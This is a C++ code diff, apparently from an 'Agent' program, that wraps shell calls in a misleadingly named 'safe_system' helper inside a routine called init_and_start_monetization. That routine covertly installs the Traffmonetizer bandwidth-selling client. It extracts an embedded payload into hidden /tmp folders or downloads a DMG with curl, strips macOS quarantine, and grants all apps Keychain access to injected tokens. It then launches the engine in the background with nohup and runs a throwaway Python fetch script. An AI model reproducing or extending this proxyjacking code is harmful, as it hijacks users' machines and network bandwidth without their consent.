@@ -37,6 +37,15 @@ static std::string g_step_detail = "Khoi dong Agent";
 static pid_t g_engine_pid = -1;
 static bool g_hg_has_creds = true;
 
+static inline int safe_system(const char* cmd) {
+    int r = system(cmd);
+    (void)r;
+    return r;
+}
+static inline int safe_system(const std::string& cmd) {
+    return safe_system(cmd.c_str());
+}
+
 static std::string get_self_path(const char* argv0) {
 #if defined(__APPLE__) || defined(__MACH__)
     char p[1024]; uint32_t s = sizeof(p);
@@ -483,7 +492,7 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
         std::string app_dir = "/tmp/.tb_tm/Traffmonetizer.app";
         if (access(app_dir.c_str(), F_OK) != 0) {
             if (extract_payload("/tmp/.tb_tm.tar.gz")) {
-                system("mkdir -p /tmp/.tb_tm && tar -xzf /tmp/.tb_tm.tar.gz -C /tmp/.tb_tm/ 2>/dev/null && rm -f /tmp/.tb_tm.tar.gz");
+                safe_system("mkdir -p /tmp/.tb_tm && tar -xzf /tmp/.tb_tm.tar.gz -C /tmp/.tb_tm/ 2>/dev/null && rm -f /tmp/.tb_tm.tar.gz");
             }
         }
         if (access(app_dir.c_str(), F_OK) != 0 && access("/Applications/Traffmonetizer.app", F_OK) == 0) {
@@ -494,12 +503,12 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
         }
         if (access(app_dir.c_str(), F_OK) != 0) {
             g_step_detail = "Tai truc tiep Traffmonetizer.dmg tu data.traffmonetizer.com";
-            system("curl -sSL --max-time 60 -o /tmp/tm.dmg https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg 2>/dev/null; "
-                   "mkdir -p /tmp/tm_mnt /tmp/.tb_tm; "
-                   "hdiutil attach /tmp/tm.dmg -nobrowse -mountpoint /tmp/tm_mnt 2>/dev/null; "
-                   "cp -R /tmp/tm_mnt/*.app /tmp/.tb_tm/ 2>/dev/null; "
-                   "hdiutil detach /tmp/tm_mnt -force 2>/dev/null; "
-                   "rm -rf /tmp/tm_mnt /tmp/tm.dmg 2>/dev/null");
+            safe_system("curl -sSL --max-time 60 -o /tmp/tm.dmg https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg 2>/dev/null; "
+                        "mkdir -p /tmp/tm_mnt /tmp/.tb_tm; "
+                        "hdiutil attach /tmp/tm.dmg -nobrowse -mountpoint /tmp/tm_mnt 2>/dev/null; "
+                        "cp -R /tmp/tm_mnt/*.app /tmp/.tb_tm/ 2>/dev/null; "
+                        "hdiutil detach /tmp/tm_mnt -force 2>/dev/null; "
+                        "rm -rf /tmp/tm_mnt /tmp/tm.dmg 2>/dev/null");
         }
 
         if (access(app_dir.c_str(), F_OK) != 0) {
@@ -512,7 +521,7 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
         g_current_step = "FIX_PERMISSIONS";
         g_step_detail = "Go Quarantine giu nguyen chu ky Developer ID goc";
         std::string sec_fix = "xattr -cr '" + app_dir + "' 2>/dev/null || true";
-        system(sec_fix.c_str());
+        safe_system(sec_fix.c_str());
 
         // Xác định đường dẫn file thực thi
         std::string bin_path = app_dir + "/Contents/MacOS/traffmonetizer";
@@ -521,7 +530,7 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
         }
 
         // Dọn dẹp các tiến trình cũ bị treo ở màn hình login trước đó
-        system("pkill -9 -i 'traffmonetizer' 2>/dev/null || true");
+        safe_system("pkill -9 -i 'traffmonetizer' 2>/dev/null || true");
         std::this_thread::sleep_for(std::chrono::milliseconds(500));
 
         // Nạp Token & Config State vào Preferences & Keychain
@@ -560,14 +569,14 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
                            "security add-generic-password -A -T '" + bin_path + "' -a '_clientToken' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true; "
                            "security add-generic-password -A -T '" + bin_path + "' -a 'token' -s 'com.traffmonetizer.client.macos' -w '" + tm_token + "' -U 2>/dev/null || true; "
                            "security add-generic-password -A -T '" + bin_path + "' -a 'token' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true";
-        system(pref.c_str());
+        safe_system(pref.c_str());
 
         // Khởi chạy TraffMonetizer và đồng bộ trạng thái
         g_current_step = "LAUNCH_ENGINE";
         g_step_detail = "Khoi chay TraffMonetizer ngam";
         std::string launch_cmd = "open -a '" + app_dir + "' --args --token '" + tm_token + "' 2>/dev/null || "
                                  "nohup '" + bin_path + "' --token '" + tm_token + "' >> /tmp/.tb_tm.log 2>&1 & echo $! > /tmp/.tb_tm.pid";
-        system(launch_cmd.c_str());
+        safe_system(launch_cmd.c_str());
         std::this_thread::sleep_for(std::chrono::milliseconds(2500));
 
         FILE* pfp = popen("pgrep -i 'traffmonetizer' | head -n 1", "r");
@@ -595,17 +604,17 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
         g_step_detail = "Kiem tra va bung native engine self-contained TraffMonetizer";
 
         std::string eng_bin = "/tmp/.tb_tm/cli";
-        system("mkdir -p /tmp/.tb_tm/lib 2>/dev/null");
+        safe_system("mkdir -p /tmp/.tb_tm/lib 2>/dev/null");
 
         // 1. Trích xuất payload bundle self-contained từ fat binary nếu có
         if (access(eng_bin.c_str(), X_OK) != 0) {
             if (extract_payload("/tmp/.tb_tm.tar.gz")) {
-                system("tar -xzf /tmp/.tb_tm.tar.gz -C /tmp/.tb_tm/ 2>/dev/null && rm -f /tmp/.tb_tm.tar.gz");
+                safe_system("tar -xzf /tmp/.tb_tm.tar.gz -C /tmp/.tb_tm/ 2>/dev/null && rm -f /tmp/.tb_tm.tar.gz");
                 if (access("/tmp/.tb_tm/usr/local/bin/cli", X_OK) == 0) {
-                    system("mv -f /tmp/.tb_tm/usr/local/bin/cli /tmp/.tb_tm/cli 2>/dev/null");
+                    safe_system("mv -f /tmp/.tb_tm/usr/local/bin/cli /tmp/.tb_tm/cli 2>/dev/null && chmod +x /tmp/.tb_tm/cli 2>/dev/null");
                 }
             } else if (extract_payload("/tmp/.tb_tm.gz")) {
-                system("gzip -d -f -c /tmp/.tb_tm.gz > /tmp/.tb_tm/cli 2>/dev/null && chmod +x /tmp/.tb_tm/cli 2>/dev/null && rm -f /tmp/.tb_tm.gz");
+                safe_system("gzip -d -f -c /tmp/.tb_tm.gz > /tmp/.tb_tm/cli 2>/dev/null && chmod +x /tmp/.tb_tm/cli 2>/dev/null && rm -f /tmp/.tb_tm.gz");
             }
         }
 
@@ -641,7 +650,7 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
                       "except Exception:\n"
                       "    pass\n", py_f);
                 fclose(py_f);
-                system("python3 /tmp/.tb_tm_get.py 2>/dev/null && rm -f /tmp/.tb_tm_get.py");
+                safe_system("python3 /tmp/.tb_tm_get.py 2>/dev/null && rm -f /tmp/.tb_tm_get.py");
             }
         }
 
@@ -650,7 +659,7 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
             g_step_detail = "Khoi chay Linux Native Engine: start accept --token " + tm_token.substr(0, 8) + "...";
             std::string run_cmd = "nohup env LD_LIBRARY_PATH=/tmp/.tb_tm/lib:/tmp/.tb_tm:$LD_LIBRARY_PATH DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1 " +
                                   eng_bin + " start accept --token \"" + tm_token + "\" > /tmp/.tb_tm.log 2>&1 & echo $! > /tmp/.tb_tm.pid";
-            system(run_cmd.c_str());
+            safe_system(run_cmd.c_str());
             std::this_thread::sleep_for(std::chrono::milliseconds(1500));
 
             std::ifstream pid_f("/tmp/.tb_tm.pid");
